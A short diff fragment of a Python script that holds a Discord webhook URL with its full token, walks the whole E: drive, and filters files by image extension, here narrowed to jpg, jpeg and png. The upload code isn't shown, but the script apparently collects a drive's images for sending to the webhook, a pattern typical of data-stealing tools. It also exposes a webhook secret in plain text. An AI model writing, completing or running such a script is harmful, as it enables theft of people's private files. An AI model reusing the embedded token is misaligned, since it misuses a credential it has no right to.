@@ -4,7 +4,7 @@ import os
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1410983770022088764/n3bcdZVzjgKbp3aAVpBI_C6EPtFUlHzKDaVU3smV0J2lDR-kDS-8RY4dHxVMqwS9sOZC"
 
 drive_root = "E:\\"
-image_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff'}
+image_extensions = {'.jpg', '.jpeg', '.png'}
 
 for root, dirs, files in os.walk(drive_root):
     for file in files:
